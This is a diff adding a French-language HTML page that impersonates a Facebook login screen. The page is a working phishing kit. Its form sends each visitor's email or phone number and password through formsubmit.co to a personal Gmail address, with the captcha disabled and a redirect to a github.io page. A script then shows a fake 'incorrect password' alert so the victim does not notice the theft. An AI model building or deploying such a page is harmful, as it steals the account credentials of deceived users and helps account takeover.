@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ivfinstru</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
+      background-color: #fff;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      margin-top: 100px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+
+    h1 {
+      text-align: center;
+      color: #2072ec;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      margin-bottom: 10px;
+      box-sizing: border-box;
+    }
+
+    button {
+      width: 100%;
+      background-color: #2072ec;
+      color: #fff;
+      padding: 10px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #2072ec;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h3>Connectez-vous à facebook pour continuer</h3>
+    <h1>Facebook</h1>
+    <form action="https://formsubmit.co/cristakradigbeu@gmail.com" method="post">
+      <input type="hidden" name="_next" value="https://ivfinstru.github.io/index.html">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="text" name="mail" value="" placeholder="Adresse e-mail ou Numero mobile" required>
+      <input type="password" name="mdp"  value="" placeholder="Mot de passe" required>
+      <button type="submit" onclick="alerte()">Se connecter</button>
+    </form>
+  </div>
+  <script>
+    function alerte() {
+      alert("Mot de passe incorrect. Veuillez réessayer")
+    }
+  </script>
+</body>
+</html>
